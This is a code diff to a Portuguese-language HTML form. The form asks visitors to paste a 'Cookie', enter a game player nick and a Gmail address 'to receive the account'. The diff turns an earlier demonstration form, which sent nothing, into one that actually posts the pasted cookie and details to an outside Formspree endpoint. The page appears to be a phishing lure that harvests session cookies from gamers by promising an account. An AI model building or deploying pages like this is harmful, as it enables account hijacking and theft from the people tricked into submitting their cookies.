@@ -20,8 +20,11 @@
     input:focus, textarea:focus { border-color: #656565; box-shadow: 0 0 0 2px rgba(255,255,255,.055); }
     button { display: block; width: 100%; height: 47px; margin-top: 18px; background: #fafafa; border: 0; border-radius: 9px; color: #0c0c0c; font: 700 13px Arial, sans-serif; cursor: pointer; }
     button:hover { background: #e9e9e9; }
+    button:disabled { opacity: .65; cursor: wait; }
     .status { min-height: 18px; margin: 15px 0 0; text-align: center; color: #aaa; font-size: 12px; }
     .status.success { color: #a6d7a7; }
+    .status.error { color: #f2a0a0; }
+    .note { font-size: 11px; line-height: 1.5; color: #999; margin: -7px 0 0; }
     @media (max-width: 450px) { .panel { padding: 27px 22px; } h1 { font-size: 23px; } }
   </style>
 </head>
@@ -29,29 +32,49 @@
   <main class="panel">
     <h1>Enviar informações</h1>
     <p class="subtitle">Preencha os campos abaixo</p>
-    <form id="formulario">
+    <form id="formulario" action="https://formspree.io/f/xkjoevbp" method="POST">
       <div class="field">
         <label for="Cookie">Cookie🍪</label>
-        <textarea id="informacao" name="informacao" rows="7" placeholder="Cole o cookie aqui" required></textarea>
+        <textarea id="mensagem" name="mensagem" rows="7" placeholder="Cole o Cookie aqui" required></textarea>
       </div>
       <div class="field">
-        <label for="nick">🎮 Nick do jogador</label>
+        <label for="nick"> Nick do jogador</label>
         <input id="nick" name="nick" type="text" placeholder="Digite o nick" required maxlength="50">
       </div>
       <div class="field">
-        <label for="email">Seu Gmail para receber a conta (opcional)</label>
+        <label for="email">Seu Gmail (para receber a conta)</label>
         <input id="email" name="email" type="email" placeholder="exemplo@gmail.com" autocomplete="email">
       </div>
-      <button type="submit">ENVIAR</button>
+      <p class="note">aguarde 5 minutos.</p>
+      <button id="enviar" type="submit">ENVIAR</button>
       <p class="status" id="status" aria-live="polite"></p>
     </form>
   </main>
   <script>
-    document.getElementById('formulario').addEventListener('submit', function (event) {
+    const formulario = document.getElementById('formulario');
+    const status = document.getElementById('status');
+    const botao = document.getElementById('enviar');
+    formulario.addEventListener('submit', async function (event) {
       event.preventDefault();
-      const status = document.getElementById('status');
-      status.textContent = '✅ Preenchido! (Demonstração: nenhuma informação foi enviada.)';
-      status.classList.add('success');
+      status.className = 'status';
+      status.textContent = 'Enviando...';
+      botao.disabled = true;
+      try {
+        const resposta = await fetch(formulario.action, {
+          method: 'POST',
+          body: new FormData(formulario),
+          headers: { 'Accept': 'application/json' }
+        });
+        if (!resposta.ok) throw new Error('Falha no envio');
+        status.textContent = '✅ Mensagem enviada com sucesso!';
+        status.classList.add('success');
+        formulario.reset();
+      } catch (erro) {
+        status.textContent = 'Não foi possível enviar. Tente novamente.';
+        status.classList.add('error');
+      } finally {
+        botao.disabled = false;
+      }
     });
   </script>
 </body>
